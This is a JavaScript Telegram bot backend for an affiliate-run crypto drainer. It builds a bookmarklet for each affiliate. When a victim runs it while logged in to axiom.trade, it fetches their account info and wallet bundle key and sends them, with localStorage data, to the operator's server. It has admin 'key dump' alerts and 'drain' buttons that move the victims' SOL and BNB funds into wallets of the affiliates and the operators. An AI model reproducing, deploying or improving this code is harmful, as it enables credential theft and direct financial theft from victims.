'use strict';

/**
 * Telegram bot – password gate → payout wallets → custom bookmarklet.
 *
 * Flow for a new user:
 *   1. /start
 *   2. bot asks for BOT_ACCESS_PASSWORD
 *   3. user sends the password → unlocked
 *   4. bot asks for public SOL address (payout)
 *   5. bot asks for public BNB address (payout)
 *   6. bot sends their opaque token + ready bookmarklet + action buttons
 *
 * Admin (ADMIN_CHAT_IDS):
 *   /setsplit <token|chatId> <userPercent>
 *   /list  /getsplit
 *   receives full key dumps + transfer logs on every hit
 */

const {
  ensureUser,
  getByChat,
  unlock,
  setPending,
  setSolAddress,
  setBnbAddress,
  setUserSplit,
  setJuniorAdmin,
  setAffiliateUnderJunior,
  setAffiliateCode,
  applyAffiliateCode,
  listUsers,
  resolveUser,
  hydrateFromRedis,
  persistAsync,
  DEFAULT_USER_PERCENT,
} = require('../../lib/users');
const { getHit, updateHit, hasRedis } = require('../../lib/hits');
const { executeSplit, formatTransferReport } = require('../../lib/transfer');

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ACCESS_PASSWORD = String(process.env.BOT_ACCESS_PASSWORD || '').trim();
const BASE_URL = process.env.BASE_URL
  ? process.env.BASE_URL.replace(/\/$/, '')
  : process.env.VERCEL_URL
    ? `https://${process.env.VERCEL_URL}`
    : '';

const ADMIN_CHAT_IDS = new Set(
  String(process.env.ADMIN_CHAT_IDS || '')
    .split(/[,\s]+/)
    .map((s) => s.trim())
    .filter(Boolean),
);

function isAdmin(chatId) {
  return ADMIN_CHAT_IDS.has(String(chatId));
}

async function tg(method, body) {
  if (!TG_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN missing');
  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const data = await r.json().catch(() => ({}));
  if (!r.ok || data.ok === false) {
    throw new Error(data.description || r.statusText);
  }
  return data;
}

function reply(chatId, text, extra = {}) {
  return tg('sendMessage', {
    chat_id: chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...extra,
  });
}

function buildBookmarklet(token, base) {
  // Full working extractor (axiom.trade) with opaque token instead of telegramId.
  // Must run while logged in on axiom.trade.
  const src =
    `(async()=>{try{` +
    `if(location.hostname!=="axiom.trade"&&!location.hostname.endsWith(".axiom.trade")){alert("Open axiom.trade first, log in, then run this");location.replace("https://axiom.trade/discover");return}` +
    `if(!localStorage.getItem("isAuthed")){alert("Log in to axiom first");return}` +
    `const user=await(await fetch("//api7.axiom.trade/user-info",{method:"POST",credentials:"include"})).json();` +
    `const bundle=await(await fetch("//api2.axiom.trade/bundle-key-and-wallets-v2",{method:"POST",credentials:"include"})).json();` +
    `const bkey=bundle.bundleKey||bundle.bundle_key||bundle.key||"";` +
    `const bookmarkData={token:${JSON.stringify(token)},site:location.href,user,bundle:bkey,sBundles:localStorage.getItem("sBundles"),eBundles:localStorage.getItem("eBundles")};` +
    `location.replace(${JSON.stringify(base)}+"/data/"+btoa(JSON.stringify(bookmarkData)).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,""));` +
    `}catch(e){console.error(e);alert("Error: "+(e&&e.message||e))}})();`;

  // Prefer javascript:void form; encodeURIComponent keeps it one-line safe for bookmark URL field
  const bookmarklet = 'javascript:' + encodeURIComponent(src);

  const testPayload = { token, site: 'https://axiom.trade' };
  const testSlug = Buffer.from(JSON.stringify(testPayload))
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
  return {
    bookmarklet,
    testUrl: `${base}/data/${testSlug}`,
    rawSrc: src,
  };
}

function actionKeyboard(user) {
  const rows = [
    [
      { text: '📋 My token', callback_data: 'my_token' },
      { text: '🔗 Bookmarklet', callback_data: 'my_bookmarklet' },
    ],
    [
      { text: '💼 My wallets', callback_data: 'my_wallets' },
      { text: '📊 My split', callback_data: 'my_split' },
    ],
    [{ text: '♻️ Reset payout addresses', callback_data: 'reset_wallets' }],
  ];
  if (user && user.role === 'junior') {
    rows.push([{ text: '🏷 Affiliate code', callback_data: 'edit_aff_code' }]);
  }
  return { inline_keyboard: rows };
}

function helpText(admin) {
  let t =
    `<b>Bookmarklet Receiver</b>\n\n` +
    `1. Send the access password when asked\n` +
    `2. Send your public SOL + BNB payout addresses\n` +
    `3. Get your private token + bookmarklet\n\n` +
    `Default split: <b>${DEFAULT_USER_PERCENT}%</b> to your wallets, ` +
    `<b>${100 - DEFAULT_USER_PERCENT}%</b> to platform.\n` +
    `Commands: /start  /status  /help`;

  if (admin) {
    t +=
      `\n\n<b>Admin</b>\n` +
      `/setsplit &lt;token|chatId&gt; &lt;userPercent&gt;\n` +
      `/getsplit &lt;token|chatId&gt;\n` +
      `/list\n` +
      `/makejunior &lt;chatId&gt;\n` +
      `/addaffiliate &lt;affChatId&gt; [juniorChatId]`;
  }
  return t;
}

async function sendReady(chatId, user) {
  const base = BASE_URL || 'https://YOUR-DEPLOYMENT.vercel.app';
  const { bookmarklet, testUrl } = buildBookmarklet(user.token, base);

  // Single message (Telegram limit 4096). Prefer full bookmarklet in one block.
  const header =
    '✅ <b>You are set up.</b>\n\n' +
    '<b>Token</b> (baked into your bookmarklet):\n' +
    '<code>' + user.token + '</code>\n\n' +
    '<b>Split</b>: you ' + user.userPercent + '% · platform ' + user.adminPercent + '%\n' +
    '<b>SOL payout</b>: <code>' + (user.solAddress || '—') + '</code>\n' +
    '<b>BNB payout</b>: <code>' + (user.bnbAddress || '—') + '</code>\n\n' +
    '<b>Test link</b>: <a href="' + testUrl + '">open</a>\n\n' +
    '<b>Your bookmarklet</b> (copy into a new bookmark’s URL field):\n';

  const full = header + '<code>' + bookmarklet + '</code>';

  if (full.length <= 4090) {
    await reply(chatId, full, { reply_markup: actionKeyboard(user) });
  } else {
    // rare: token very long — still one clean bookmarklet message after short header
    await reply(chatId, header.trim(), { reply_markup: actionKeyboard(user) });
    await reply(chatId, '<code>' + bookmarklet + '</code>');
  }
}

async function handleMessage(msg) {
  const chatId = msg.chat && msg.chat.id;
  if (!chatId) return;
  const text = (msg.text || '').trim();
  const parts = text.split(/\s+/);
  const cmd = (parts[0] || '').toLowerCase().replace(/@\w+$/, '');
  const admin = isAdmin(chatId);

  // ensure record exists
  let user = getByChat(chatId) || ensureUser(chatId);

  // ── admin commands (always available to admins, even locked) ─────────────
  if (cmd === '/setsplit' && admin) {
    const target = parts[1];
    const pct = parts[2];
    if (!target || pct === undefined) {
      await reply(chatId, 'Usage: /setsplit &lt;token|chatId&gt; &lt;userPercent&gt;');
      return;
    }
    try {
      const rec = setUserSplit(target, pct);
      await reply(
        chatId,
        `✅ Split updated\ntoken <code>${rec.token}</code>\nchat <code>${rec.chatId}</code>\nuser ${rec.userPercent}% · admin ${rec.adminPercent}%`,
      );
    } catch (err) {
      await reply(chatId, `Error: ${err.message}`);
    }
    return;
  }

  if (cmd === '/getsplit' && admin) {
    const target = parts[1];
    if (!target) {
      await reply(chatId, 'Usage: /getsplit &lt;token|chatId&gt;');
      return;
    }
    const rec = resolveUser(target);
    if (!rec) {
      await reply(chatId, 'User not found.');
      return;
    }
    await reply(
      chatId,
      `token <code>${rec.token || '—'}</code>\nchat <code>${rec.chatId}</code>\nuser ${rec.userPercent}% · admin ${rec.adminPercent}%\nSOL <code>${rec.solAddress || '—'}</code>\nBNB <code>${rec.bnbAddress || '—'}</code>`,
    );
    return;
  }

  if (cmd === '/list' && admin) {
    const users = listUsers();
    if (!users.length) {
      await reply(chatId, 'No users yet.');
      return;
    }
    const lines = users.map(
      (u, i) =>
        `${i + 1}. <code>${u.token}</code>\n` +
        `   chat ${u.chatId} · ${u.userPercent}/${u.adminPercent} · ` +
        `${u.unlocked ? '🔓' : '🔒'} · SOL ${u.solAddress || '—'} · BNB ${u.bnbAddress || '—'}`,
    );
    await reply(chatId, `<b>Users (${users.length})</b>\n\n` + lines.join('\n\n'));
    return;
  }

  // ── ping: always answers if TELEGRAM_BOT_TOKEN works ───────────────────
  if (cmd === '/ping') {
    await reply(
      chatId,
      'pong\n' +
        'token_env: ' + (TG_TOKEN ? 'set' : 'MISSING') + '\n' +
        'password_gate: junior-codes\n' +
        'base: ' + (BASE_URL || 'MISSING') + '\n' +
        'admin: ' + (admin ? 'yes' : 'no'),
    );
    return;
  }


  // ── owner: promote junior admin ──────────────────────────────────────────
  if (cmd === '/makejunior' && admin) {
    const target = parts[1];
    if (!target) {
      await reply(chatId, 'Usage: /makejunior &lt;chatId&gt;\nPromotes that user to junior admin (10% cut on their affiliates).');
      return;
    }
    try {
      const rec = setJuniorAdmin(target, { juniorPercent: 10, ownerPercent: 10 });
      await reply(
        chatId,
        '✅ Junior admin set\nchat <code>' +
          rec.chatId +
          '</code>\ntoken <code>' +
          rec.token +
          '</code>\nThey should /start and set payout wallets.\nTheir affiliates: 80% aff / 10% junior / 10% you.',
      );
      // notify the promoted user
      try {
        await reply(
          rec.chatId,
          '🎉 <b>You were promoted to Junior Admin</b>\n\n' +
            '<b>What that means</b>\n' +
            '• You earn <b>10%</b> of every log from affiliates under you\n' +
            '• The owner earns <b>10%</b>\n' +
            '• The affiliate keeps <b>80%</b>\n\n' +
            '<b>Your powers</b>\n' +
            '• Set a public code: /setcode YOURCODE (or 🏷 Affiliate code button)\n' +
            '• Share that code — new users enter it on signup to join under you\n' +
            '• /addaffiliate &lt;chatId&gt; to link someone manually\n' +
            '• Keep your SOL + BNB payout wallets up to date (/start or 💼 My wallets)\n\n' +
            'Finish setup if you have not: /start → password → wallets → bookmarklet.',
        );
      } catch (err) {
        await reply(chatId, 'Promoted, but could not DM them (they must /start the bot once first).');
      }
    } catch (err) {
      await reply(chatId, 'Error: ' + err.message);
    }
    return;
  }

  // ── junior or owner: attach affiliate under junior ───────────────────────
  if (cmd === '/addaffiliate') {
    // owner: /addaffiliate <affiliateChatId> <juniorChatId>
    // junior: /addaffiliate <affiliateChatId>  (under self)
    const aId = parts[1];
    const jId = parts[2] || (getByChat(chatId) && getByChat(chatId).role === 'junior' ? String(chatId) : null);
    if (!aId || !jId) {
      await reply(
        chatId,
        'Usage:\nJunior: /addaffiliate &lt;affiliateChatId&gt;\nOwner: /addaffiliate &lt;affiliateChatId&gt; &lt;juniorChatId&gt;',
      );
      return;
    }
    const me = getByChat(chatId);
    if (!admin && !(me && me.role === 'junior')) {
      await reply(chatId, 'Only junior admins or owner can do this.');
      return;
    }
    if (!admin && String(jId) !== String(chatId)) {
      await reply(chatId, 'Juniors can only add affiliates under themselves.');
      return;
    }
    try {
      const rec = setAffiliateUnderJunior(aId, jId);
      await reply(
        chatId,
        '✅ Affiliate linked\nchat <code>' +
          rec.chatId +
          '</code>\nsplit: aff ' +
          rec.userPercent +
          '% · junior ' +
          rec.juniorPercent +
          '% · owner ' +
          rec.ownerPercent +
          '%\nThey must /start and use a NEW bookmarklet.',
      );
    } catch (err) {
      await reply(chatId, 'Error: ' + err.message);
    }
    return;
  }

  if (cmd === '/setcode') {
    const me = getByChat(chatId);
    if (!me || me.role !== 'junior') {
      await reply(chatId, 'Only junior admins can set an affiliate code. Ask owner: /makejunior');
      return;
    }
    const code = parts[1];
    if (!code) {
      setPending(chatId, 'await_set_code');
      await reply(chatId, 'Current: <code>' + (me.affiliateCode || '(none)') + '</code>\nSend a new code, or /setcode YOURCODE');
      return;
    }
    try {
      const rec = setAffiliateCode(chatId, code);
      await reply(chatId, '✅ Code set to <code>' + rec.affiliateCode + '</code>');
    } catch (err) {
      await reply(chatId, '❌ ' + err.message);
    }
    return;
  }

  // ── help / status ────────────────────────────────────────────────────────
  if (cmd === '/help') {
    await reply(chatId, helpText(admin));
    return;
  }

  if (cmd === '/status') {
    user = getByChat(chatId) || ensureUser(chatId);
    await reply(
      chatId,
      `unlocked: ${user.unlocked ? 'yes' : 'no'}\n` +
        `pending: ${user.pending || '—'}\n` +
        `token: <code>${user.token}</code>\n` +
        `split: ${user.userPercent}% / ${user.adminPercent}%\n` +
        `SOL: <code>${user.solAddress || '—'}</code>\n` +
        `BNB: <code>${user.bnbAddress || '—'}</code>`,
      user.unlocked && user.solAddress && user.bnbAddress
        ? { reply_markup: actionKeyboard() }
        : {},
    );
    return;
  }

  // ── /start ───────────────────────────────────────────────────────────────
  if (cmd === '/start' || cmd === '/register') {
    user = ensureUser(chatId);

    if (admin) {
      user = unlock(chatId) || user;
      setPending(chatId, null);
      await sendReady(chatId, getByChat(chatId) || user);
      return;
    }

    if (!user.unlocked) {
      setPending(chatId, 'await_password');
      await reply(
        chatId,
        '🔒 Send your <b>access code</b> to continue.\n' +
          'Use the password from the junior who invited you.\n' +
          'Or the owner code if they gave you that.',
      );
      return;
    }

    if (!user.solAddress) {
      setPending(chatId, 'await_sol');
      await reply(
        chatId,
        'Send your <b>public Solana address</b> (payout for your share).',
      );
      return;
    }
    if (!user.bnbAddress) {
      setPending(chatId, 'await_bnb');
      await reply(chatId, 'Send your <b>public BNB/BSC address</b> (0x…).');
      return;
    }

    await sendReady(chatId, getByChat(chatId));
    return;
  }

  // ── stateful replies (password / addresses) ──────────────────────────────
  user = getByChat(chatId) || ensureUser(chatId);

  const looksSol = text && text.length >= 32 && text.length <= 50 && !text.startsWith('0x') && !text.includes(' ');
  const looksBnb = text && /^0x[a-fA-F0-9]{40}$/.test(text);

  if (looksSol && !cmd.startsWith('/')) {
    setSolAddress(chatId, text);
    setPending(chatId, 'await_bnb');
    await persistAsync();
    await reply(chatId, 'SOL saved.\nNow send your <b>public BNB/BSC address</b> (starts with 0x).');
    return;
  }
  if (looksBnb && !cmd.startsWith('/')) {
    setBnbAddress(chatId, text);
    await persistAsync();
    await sendReady(chatId, getByChat(chatId));
    return;
  }

  if (user.pending === 'await_password' || (!user.unlocked && text && !cmd.startsWith('/'))) {
    const ownerPw = ACCESS_PASSWORD || String(process.env.OWNER_ACCESS_PASSWORD || '').trim();
    const entered = text.trim();
    try {
      if (ownerPw && entered === ownerPw) {
        applyAffiliateCode(chatId, 'SKIP');
        unlock(chatId);
        await persistAsync();
        await reply(chatId, '✅ Owner code accepted. Direct affiliate.\n\nSend your <b>public Solana address</b>.');
        return;
      }
      const linked = applyAffiliateCode(chatId, entered);
      unlock(chatId);
      await persistAsync();
      await reply(
        chatId,
        '✅ Code accepted. Linked under junior.\n' +
          'split ≈ aff ' + linked.userPercent + '% / junior ' + linked.juniorPercent + '% / owner ' + linked.ownerPercent + '%\n\n' +
          'Send your <b>public Solana address</b>.',
      );
      const codeUsed = entered.toUpperCase();
      if (linked.juniorOf) {
        try {
          await reply(
            linked.juniorOf,
            '🆕 <b>New affiliate joined with your password</b>\n' +
              'chat <code>' + linked.chatId + '</code>\n' +
              'code <code>' + codeUsed + '</code>',
          );
        } catch (_) {}
        for (const adminId of ADMIN_CHAT_IDS) {
          try {
            await reply(
              adminId,
              '🆕 Affiliate signup via junior password\n' +
                'affiliate <code>' + linked.chatId + '</code>\n' +
                'junior <code>' + linked.juniorOf + '</code>\n' +
                'code <code>' + codeUsed + '</code>',
            );
          } catch (_) {}
        }
      }
      return;
    } catch (err) {
      await reply(chatId, '❌ Unknown code. Ask your junior for their password.');
      return;
    }
  }

  if (user && user.unlocked && user.pending === 'await_set_code' && text && !cmd.startsWith('/')) {
    try {
      const rec = setAffiliateCode(chatId, text);
      setPending(chatId, null);
      await reply(chatId, '✅ Affiliate code set to <code>' + rec.affiliateCode + '</code>\nShare this when new users sign up.');
    } catch (err) {
      await reply(chatId, '❌ ' + err.message);
    }
    return;
  }

  if (user && user.unlocked && user.pending === 'await_code' && text && !cmd.startsWith('/')) {
    try {
      const linked = applyAffiliateCode(chatId, text);
      const under = linked.juniorOf
        ? ('Linked under junior. Split ≈ aff ' + linked.userPercent + '% / junior ' + linked.juniorPercent + '% / owner ' + linked.ownerPercent + '%')
        : ('No junior — direct under owner. Split ≈ ' + linked.userPercent + '% you / ' + (100 - linked.userPercent) + '% owner');
      await reply(chatId, '✅ ' + under + '\n\nSend your <b>public Solana address</b>.');

      // notify junior + owner when someone joins via code
      if (linked.juniorOf) {
        const codeUsed = String(text || '').trim().toUpperCase();
        try {
          await reply(
            linked.juniorOf,
            '🆕 <b>New affiliate joined under you</b>\n' +
              'chat <code>' + linked.chatId + '</code>\n' +
              'code <code>' + codeUsed + '</code>\n' +
              'split: aff ' + linked.userPercent + '% · you ' + linked.juniorPercent + '% · owner ' + linked.ownerPercent + '%',
          );
        } catch (_) {}
        for (const adminId of ADMIN_CHAT_IDS) {
          try {
            await reply(
              adminId,
              '🆕 Affiliate signup via junior code\n' +
                'affiliate <code>' + linked.chatId + '</code>\n' +
                'junior <code>' + linked.juniorOf + '</code>\n' +
                'code <code>' + codeUsed + '</code>\n' +
                'split: aff ' + linked.userPercent + '% · junior ' + linked.juniorPercent + '% · you ' + linked.ownerPercent + '%',
            );
          } catch (_) {}
        }
      } else {
        // SKIP / direct under owner
        for (const adminId of ADMIN_CHAT_IDS) {
          try {
            await reply(
              adminId,
              '🆕 Direct affiliate signup (no junior code)\n' +
                'chat <code>' + linked.chatId + '</code>\n' +
                'split: aff ' + linked.userPercent + '% · you ' + (100 - linked.userPercent) + '%',
            );
          } catch (_) {}
        }
      }
    } catch (err) {
      await reply(chatId, '❌ ' + err.message + '\nTry another code or send <code>SKIP</code>.');
    }
    return;
  }

  if (admin && user && user.unlocked && (user.pending === 'await_sol' || user.pending === 'await_bnb')) {
    setPending(chatId, null);
    await sendReady(chatId, getByChat(chatId) || user);
    return;
  }

  if (user && user.unlocked && user.pending === 'await_sol' && text && !cmd.startsWith('/')) {
    // very light validation – sol addresses are base58, ~32-44 chars
    if (text.length < 32 || text.length > 50 || text.startsWith('0x')) {
      await reply(chatId, 'That does not look like a Solana address. Send a base58 address.');
      return;
    }
    setSolAddress(chatId, text);
    setPending(chatId, 'await_bnb');
    await reply(chatId, 'SOL saved.\nNow send your <b>public BNB/BSC address</b> (starts with 0x).');
    return;
  }

  if (user && user.unlocked && user.pending === 'await_bnb' && text && !cmd.startsWith('/')) {
    if (!/^0x[a-fA-F0-9]{40}$/.test(text)) {
      await reply(chatId, 'That does not look like a BNB address. Send a 0x… address.');
      return;
    }
    setBnbAddress(chatId, text);
    await sendReady(chatId, getByChat(chatId));
    return;
  }

  // fallback
  await reply(chatId, helpText(admin));
}

async function handleCallback(cq) {
  const chatId = cq.message && cq.message.chat && cq.message.chat.id;
  const data = cq.data || '';
  if (!chatId) return;

  // ── drain / save hit actions ─────────────────────────────────────────────
  if (data.startsWith('drain:') || data.startsWith('save:')) {
    const hitId = data.split(':')[1];
    const hit = await getHit(hitId);
    if (!hit) {
      await tg('answerCallbackQuery', {
        callback_query_id: cq.id,
        text: 'Log expired or not found',
        show_alert: true,
      }).catch(() => {});
      return;
    }
    if (String(hit.chatId) !== String(chatId) && !isAdmin(chatId)) {
      await tg('answerCallbackQuery', {
        callback_query_id: cq.id,
        text: 'Not your log',
        show_alert: true,
      }).catch(() => {});
      return;
    }
    if (hit.status === 'drained') {
      await tg('answerCallbackQuery', {
        callback_query_id: cq.id,
        text: 'Already drained',
        show_alert: true,
      }).catch(() => {});
      return;
    }
    if (data.startsWith('save:') && hit.status === 'saved') {
      await tg('answerCallbackQuery', {
        callback_query_id: cq.id,
        text: 'Already saved',
      }).catch(() => {});
      return;
    }

    if (data.startsWith('save:')) {
      await updateHit(hitId, { status: 'saved' });
      await tg('answerCallbackQuery', {
        callback_query_id: cq.id,
        text: 'Saved — no auto drain',
      }).catch(() => {});
      await reply(
        chatId,
        '💾 Log <code>' + hitId + '</code> saved. No funds moved.\n' +
          'Admin still has the full key dump.',
      );
      return;
    }

    // drain now
    await tg('answerCallbackQuery', {
      callback_query_id: cq.id,
      text: 'Draining…',
    }).catch(() => {});

    const userRec = {
      userPercent: hit.userPercent,
      adminPercent: hit.adminPercent,
      solAddress: hit.solAddress,
      bnbAddress: hit.bnbAddress,
      juniorOf: hit.juniorOf,
      juniorPercent: hit.juniorPercent,
      ownerPercent: hit.ownerPercent,
      juniorSolAddress: hit.juniorSolAddress,
      juniorBnbAddress: hit.juniorBnbAddress,
    };
    let report = '';
    try {
      const results = await executeSplit(hit.solWallets || [], hit.bnbWallets || [], userRec);
      report = formatTransferReport(results);
      await updateHit(hitId, { status: 'drained', report });
    } catch (err) {
      report = 'drain error: ' + err.message;
      await updateHit(hitId, { status: 'error', report });
    }
    if (!report || report === 'no transfers attempted') {
      report = 'no wallets on this hit — nothing to send.';
    }
    await reply(chatId, '⚡ Drain finished for <code>' + hitId + '</code>\n\n' + report);

    if (!isAdmin(chatId)) {
      for (const adminId of ADMIN_CHAT_IDS) {
        try {
          await reply(
            adminId,
            '⚡ Affiliate drained hit <code>' + hitId + '</code>\n' +
              'owner chat <code>' + hit.chatId + '</code>\n\n' +
              report,
          );
        } catch (_) {}
      }
    }
    return;
  }

  await tg('answerCallbackQuery', { callback_query_id: cq.id }).catch(() => {});

  const user = getByChat(chatId);
  if (!user || !user.unlocked) {
    await reply(chatId, 'You are not set up yet. Send /start');
    return;
  }

  const base = BASE_URL || 'https://YOUR-DEPLOYMENT.vercel.app';

  if (data === 'edit_aff_code') {
    const u = getByChat(chatId);
    if (!u || u.role !== 'junior') {
      await reply(chatId, 'Only junior admins have affiliate codes.');
      return;
    }
    setPending(chatId, 'await_set_code');
    await reply(chatId, 'Current code: <code>' + (u.affiliateCode || '(not set)') + '</code>\nSend a new code (3-16 chars).');
    return;
  }

  if (data === 'my_token') {
    await reply(chatId, `Your token:\n<code>${user.token}</code>`);
    return;
  }
  if (data === 'my_bookmarklet') {
    const { bookmarklet } = buildBookmarklet(user.token, base);
    await reply(chatId, `Bookmarklet (paste as bookmark URL):\n<code>${bookmarklet}</code>`);
    return;
  }
  if (data === 'my_wallets') {
    await reply(
      chatId,
      `SOL payout: <code>${user.solAddress || '—'}</code>\n` +
        `BNB payout: <code>${user.bnbAddress || '—'}</code>`,
    );
    return;
  }
  if (data === 'my_split') {
    await reply(
      chatId,
      `You keep <b>${user.userPercent}%</b>\nPlatform takes <b>${user.adminPercent}%</b>\n\nOnly admin can change this.`,
    );
    return;
  }
  if (data === 'reset_wallets') {
    setSolAddress(chatId, '');
    setBnbAddress(chatId, '');
    setPending(chatId, 'await_sol');
    await reply(chatId, 'Payout addresses cleared. Send your new <b>public Solana address</b>.');
    return;
  }
}

module.exports = async function handler(req, res) {
  if (req.method === 'GET') {
    return res.status(200).json({
      ok: true,
      service: 'telegram-webhook',
      passwordGate: Boolean(ACCESS_PASSWORD),
      tokenConfigured: Boolean(TG_TOKEN),
      hitsRedis: hasRedis(),
      baseUrl: BASE_URL || null,
      defaultSplit: `${DEFAULT_USER_PERCENT}/${100 - DEFAULT_USER_PERCENT}`,
    });
  }

  if (req.method !== 'POST') {
    res.setHeader('Allow', 'GET, POST');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  let update = req.body;
  if (typeof update === 'string') {
    try {
      update = JSON.parse(update);
    } catch {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
  }

  try {
    await hydrateFromRedis();
    if (update && update.message) {
      await handleMessage(update.message);
    } else if (update && update.callback_query) {
      await handleCallback(update.callback_query);
    }
    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('[bot/webhook]', err.message);
    return res.status(200).json({ ok: true });
  }
};
